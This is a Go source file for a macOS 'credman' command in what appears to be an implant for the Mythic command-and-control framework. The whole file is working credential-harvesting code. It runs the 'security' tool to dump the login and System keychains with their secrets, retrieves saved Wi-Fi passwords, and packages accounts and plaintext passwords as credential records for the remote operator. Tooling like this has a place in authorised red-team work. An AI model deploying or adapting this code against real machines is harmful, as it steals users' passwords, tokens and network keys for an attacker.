//go:build darwin

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"sort"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type CredmanCommand struct{}

func (c *CredmanCommand) Name() string        { return "credman" }
func (c *CredmanCommand) Description() string { return "Enumerate macOS Keychain credential stores" }

type credmanArgs struct {
	Action string `json:"action"`
	Filter string `json:"filter"`
}

func (c *CredmanCommand) Execute(task structs.Task) structs.CommandResult {
	var args credmanArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Filter = strings.TrimSpace(task.Params)
		}
	}
	if args.Action == "" {
		args.Action = "list"
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return credmanDarwinList(args, false)
	case "dump":
		return credmanDarwinList(args, true)
	default:
		return errorf("Unknown action: %s. Use: list or dump (vault is Windows-only; use 'keychain' command for targeted lookups)", args.Action)
	}
}

type darwinCredEntry struct {
	Source   string
	Label    string
	Account  string
	Service  string
	Secret   string
	Keychain string
	Class    string
	Attrs    map[string]string
}

func credmanDarwinList(args credmanArgs, showSecrets bool) structs.CommandResult {
	var allCreds []darwinCredEntry
	var sections []string

	loginCreds, loginErr := enumerateKeychain("", showSecrets)
	if loginErr != "" {
		sections = append(sections, fmt.Sprintf("[Login Keychain] %s", loginErr))
	} else {
		allCreds = append(allCreds, loginCreds...)
	}

	sysCreds, sysErr := enumerateKeychain("/Library/Keychains/System.keychain", showSecrets)
	if sysErr != "" {
		sections = append(sections, fmt.Sprintf("[System Keychain] %s", sysErr))
	} else {
		allCreds = append(allCreds, sysCreds...)
	}

	wifiCreds, wifiErr := enumerateWiFiPasswords(showSecrets)
	if wifiErr != "" {
		sections = append(sections, fmt.Sprintf("[WiFi] %s", wifiErr))
	} else {
		allCreds = append(allCreds, wifiCreds...)
	}

	if args.Filter != "" {
		allCreds = filterDarwinEntries(allCreds, args.Filter)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== macOS Credential Stores (%d entries) ===\n\n", len(allCreds)))

	var mythicCreds []structs.MythicCredential
	bySource := groupDarwinBySource(allCreds)
	sourceOrder := []string{"Generic Password", "Internet Password", "WiFi"}
	for _, src := range sourceOrder {
		entries, ok := bySource[src]
		if !ok || len(entries) == 0 {
			continue
		}
		sb.WriteString(fmt.Sprintf("--- %s (%d entries) ---\n", src, len(entries)))
		for _, e := range entries {
			if e.Label != "" {
				sb.WriteString(fmt.Sprintf("  Label:    %s\n", e.Label))
			}
			if e.Service != "" {
				sb.WriteString(fmt.Sprintf("  Service:  %s\n", e.Service))
			}
			if e.Account != "" {
				sb.WriteString(fmt.Sprintf("  Account:  %s\n", e.Account))
			}
			if showSecrets && e.Secret != "" {
				sb.WriteString(fmt.Sprintf("  Secret:   %s\n", e.Secret))
			} else if e.Secret != "" {
				sb.WriteString("  Secret:   [use -action dump to reveal]\n")
			}
			if e.Keychain != "" {
				sb.WriteString(fmt.Sprintf("  Keychain: %s\n", e.Keychain))
			}
			for k, v := range e.Attrs {
				sb.WriteString(fmt.Sprintf("  %s: %s\n", k, v))
			}
			sb.WriteString("\n")

			if e.Account != "" || e.Service != "" {
				credType := "plaintext"
				credValue := e.Secret
				if !showSecrets || credValue == "" {
					credType = "plaintext"
					credValue = fmt.Sprintf("[%s credential]", src)
				}
				realm := e.Service
				if realm == "" {
					realm = e.Label
				}
				account := e.Account
				if account == "" {
					account = e.Label
				}
				mythicCreds = append(mythicCreds, structs.MythicCredential{
					CredentialType: credType,
					Realm:          realm,
					Account:        account,
					Credential:     credValue,
					Comment:        fmt.Sprintf("credman %s (macOS %s)", args.Action, src),
				})
			}
		}
	}

	if len(sections) > 0 {
		sb.WriteString("--- Notes ---\n")
		for _, s := range sections {
			sb.WriteString(fmt.Sprintf("  %s\n", s))
		}
	}

	if len(allCreds) == 0 && len(sections) == 0 {
		sb.WriteString("No credentials found in login or system keychains.\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}
	for i := range allCreds {
		structs.ZeroString(&allCreds[i].Secret)
	}
	return result
}

func enumerateKeychain(keychainPath string, showSecrets bool) ([]darwinCredEntry, string) {
	cmdArgs := []string{"dump-keychain"}
	if showSecrets {
		cmdArgs = append(cmdArgs, "-d")
	}
	if keychainPath != "" {
		cmdArgs = append(cmdArgs, keychainPath)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "security", cmdArgs...).CombinedOutput()
	outStr := string(out)

	if err != nil {
		if strings.Contains(outStr, "could not be found") || strings.Contains(outStr, "No such file") {
			return nil, fmt.Sprintf("Keychain not found: %s", keychainPath)
		}
		if showSecrets && strings.Contains(outStr, "User interaction is not allowed") {
			entries := parseKeychainDump(outStr, false)
			if len(entries) > 0 {
				return entries, "Password retrieval requires interactive session (keychain locked or authorization needed)"
			}
			cmdArgs = []string{"dump-keychain"}
			if keychainPath != "" {
				cmdArgs = append(cmdArgs, keychainPath)
			}
			ctx2, cancel2 := context.WithTimeout(context.Background(), 30*time.Second)
			defer cancel2()
			out2, err2 := exec.CommandContext(ctx2, "security", cmdArgs...).CombinedOutput()
			if err2 != nil {
				return nil, fmt.Sprintf("Error: %v", err2)
			}
			entries = parseKeychainDump(string(out2), false)
			return entries, "Password retrieval requires interactive session (keychain locked or authorization needed)"
		}
		if strings.Contains(outStr, "keychain:") {
			return parseKeychainDump(outStr, showSecrets), ""
		}
		return nil, fmt.Sprintf("Error: %v — %s", err, strings.TrimSpace(outStr))
	}

	return parseKeychainDump(outStr, showSecrets), ""
}

func parseKeychainDump(output string, includeSecrets bool) []darwinCredEntry {
	var entries []darwinCredEntry
	blocks := splitKeychainBlocks(output)

	for _, block := range blocks {
		class := extractField(block, "class:")
		if class != "\"genp\"" && class != "\"inet\"" {
			continue
		}

		entry := darwinCredEntry{
			Attrs: make(map[string]string),
		}

		if class == "\"genp\"" {
			entry.Source = "Generic Password"
			entry.Class = "genp"
		} else {
			entry.Source = "Internet Password"
			entry.Class = "inet"
		}

		entry.Keychain = extractKeychainPath(block)
		entry.Label = extractAttr(block, "0x00000007")
		entry.Account = extractAttr(block, "\"acct\"")
		entry.Service = extractAttr(block, "\"svce\"")

		if entry.Class == "inet" {
			server := extractAttr(block, "\"srvr\"")
			if server != "" {
				entry.Service = server
			}
			proto := extractAttr(block, "\"ptcl\"")
			if proto != "" {
				entry.Attrs["Protocol"] = proto
			}
			port := extractAttr(block, "\"port\"")
			if port != "" && port != "0" {
				entry.Attrs["Port"] = port
			}
		}

		desc := extractAttr(block, "\"desc\"")
		if desc != "" {
			entry.Attrs["Description"] = desc
		}

		created := extractAttr(block, "\"cdat\"")
		if created != "" {
			entry.Attrs["Created"] = created
		}

		if includeSecrets {
			entry.Secret = extractDataField(block)
		}

		if entry.Label == "" && entry.Account == "" && entry.Service == "" {
			continue
		}

		entries = append(entries, entry)
	}

	return entries
}

func splitKeychainBlocks(output string) []string {
	lines := strings.Split(output, "\n")
	var blocks []string
	var current strings.Builder
	for _, line := range lines {
		if strings.HasPrefix(line, "keychain:") && current.Len() > 0 {
			blocks = append(blocks, current.String())
			current.Reset()
		}
		current.WriteString(line)
		current.WriteString("\n")
	}
	if current.Len() > 0 {
		blocks = append(blocks, current.String())
	}
	return blocks
}

func extractField(block, prefix string) string {
	for _, line := range strings.Split(block, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, prefix) {
			return strings.TrimSpace(strings.TrimPrefix(trimmed, prefix))
		}
	}
	return ""
}

func extractAttr(block, attrKey string) string {
	for _, line := range strings.Split(block, "\n") {
		trimmed := strings.TrimSpace(line)
		if !strings.HasPrefix(trimmed, attrKey) {
			continue
		}
		if strings.Contains(trimmed, "=<NULL>") {
			return ""
		}
		eqIdx := strings.Index(trimmed, "=\"")
		if eqIdx < 0 {
			continue
		}
		val := trimmed[eqIdx+2:]
		if endIdx := strings.LastIndex(val, "\""); endIdx >= 0 {
			val = val[:endIdx]
		}
		if strings.HasPrefix(val, "0x") || val == "" {
			continue
		}
		return val
	}
	return ""
}

func extractKeychainPath(block string) string {
	for _, line := range strings.Split(block, "\n") {
		if strings.HasPrefix(line, "keychain:") {
			path := strings.TrimSpace(strings.TrimPrefix(line, "keychain:"))
			path = strings.Trim(path, "\"")
			return path
		}
	}
	return ""
}

func extractDataField(block string) string {
	lines := strings.Split(block, "\n")
	for i, line := range lines {
		if strings.TrimSpace(line) != "data:" {
			continue
		}
		if i+1 >= len(lines) {
			return ""
		}
		dataLine := strings.TrimSpace(lines[i+1])
		if dataLine == "" {
			return ""
		}
		if strings.HasPrefix(dataLine, "\"") && strings.HasSuffix(dataLine, "\"") {
			return dataLine[1 : len(dataLine)-1]
		}
		if idx := strings.Index(dataLine, "  \""); idx > 0 {
			rest := dataLine[idx+3:]
			if endIdx := strings.LastIndex(rest, "\""); endIdx > 0 {
				decoded := rest[:endIdx]
				if isPrintableSecret(decoded) {
					return decoded
				}
			}
		}
		return ""
	}
	return ""
}

func isPrintableSecret(s string) bool {
	if len(s) == 0 || len(s) > 1024 {
		return false
	}
	for _, r := range s {
		if r < 0x20 || r == 0x7f {
			if r != '\t' && r != '\n' && r != '\r' {
				return false
			}
		}
	}
	return true
}

func enumerateWiFiPasswords(showSecrets bool) ([]darwinCredEntry, string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "security", "find-generic-password", "-D", "AirPort network password", "-a", "", "-g", "/Library/Keychains/System.keychain").CombinedOutput()
	if err != nil {
		// No WiFi passwords or not accessible — not an error
		return nil, ""
	}

	output := string(out)
	var entries []darwinCredEntry

	for _, line := range strings.Split(output, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "\"svce\"") && strings.Contains(trimmed, "=\"") {
			ssid := extractQuotedValue(trimmed)
			if ssid != "" {
				entry := darwinCredEntry{
					Source:  "WiFi",
					Label:   ssid,
					Service: ssid,
					Attrs:   map[string]string{"Type": "AirPort network password"},
				}
				if showSecrets {
					secret := getWiFiPassword(ssid)
					if secret != "" {
						entry.Secret = secret
					}
				}
				entries = append(entries, entry)
			}
		}
	}

	if len(entries) == 0 {
		ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel2()
		listOut, listErr := exec.CommandContext(ctx2, "networksetup", "-listpreferredwirelessnetworks", "en0").CombinedOutput()
		if listErr == nil {
			for _, line := range strings.Split(string(listOut), "\n") {
				trimmed := strings.TrimSpace(line)
				if trimmed == "" || strings.HasPrefix(trimmed, "Preferred networks") {
					continue
				}
				entry := darwinCredEntry{
					Source:  "WiFi",
					Label:   trimmed,
					Service: trimmed,
					Attrs:   map[string]string{"Type": "Preferred wireless network"},
				}
				if showSecrets {
					secret := getWiFiPassword(trimmed)
					if secret != "" {
						entry.Secret = secret
					}
				}
				entries = append(entries, entry)
			}
		}
	}

	return entries, ""
}

func getWiFiPassword(ssid string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "security", "find-generic-password", "-D", "AirPort network password", "-s", ssid, "-g").CombinedOutput()
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(out), "\n") {
		if strings.HasPrefix(line, "password: ") {
			val := strings.TrimPrefix(line, "password: ")
			val = strings.Trim(val, "\"")
			if val != "" && !strings.HasPrefix(val, "0x") {
				return val
			}
		}
	}
	return ""
}

func extractQuotedValue(line string) string {
	idx := strings.Index(line, "=\"")
	if idx < 0 {
		return ""
	}
	val := line[idx+2:]
	if endIdx := strings.LastIndex(val, "\""); endIdx >= 0 {
		return val[:endIdx]
	}
	return ""
}

func filterDarwinEntries(entries []darwinCredEntry, filter string) []darwinCredEntry {
	filter = strings.ToLower(filter)
	hasWildcard := strings.Contains(filter, "*")
	var filtered []darwinCredEntry
	for _, e := range entries {
		target := strings.ToLower(e.Label + " " + e.Account + " " + e.Service)
		if hasWildcard {
			pattern := strings.ReplaceAll(filter, "*", "")
			if strings.Contains(target, pattern) {
				filtered = append(filtered, e)
			}
		} else if strings.Contains(target, filter) {
			filtered = append(filtered, e)
		}
	}
	return filtered
}

func groupDarwinBySource(entries []darwinCredEntry) map[string][]darwinCredEntry {
	m := make(map[string][]darwinCredEntry)
	for _, e := range entries {
		m[e.Source] = append(m[e.Source], e)
	}
	for _, v := range m {
		sort.Slice(v, func(i, j int) bool { return v[i].Label < v[j].Label })
	}
	return m
}
